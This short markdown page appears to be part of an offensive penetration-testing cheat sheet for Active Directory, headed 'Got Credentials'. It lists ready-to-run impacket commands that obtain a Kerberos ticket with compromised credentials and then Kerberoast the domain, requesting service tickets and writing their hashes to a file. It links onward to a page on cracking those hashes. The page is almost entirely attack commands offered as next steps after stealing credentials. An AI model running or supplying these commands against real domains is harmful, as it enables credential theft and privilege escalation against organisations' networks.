# Got Credentials
## Kerberos Authentication
```bash
impacket-getTGT domain.local/username:password

export KRB5CCNAME=username.ccache
```

## Kerberoasting
```bash
impacket-GetUserSPNs -request domain.local/username:password -dc-ip domain.local -outputfile hashes.kerbroast

impacket-GetUserSPNs -request domain.local/username -dc-ip domain.local -k -no-pass -outputfile hashes.kerberoast
```

Got Hash: [Next](cracking-hashes.md#spn)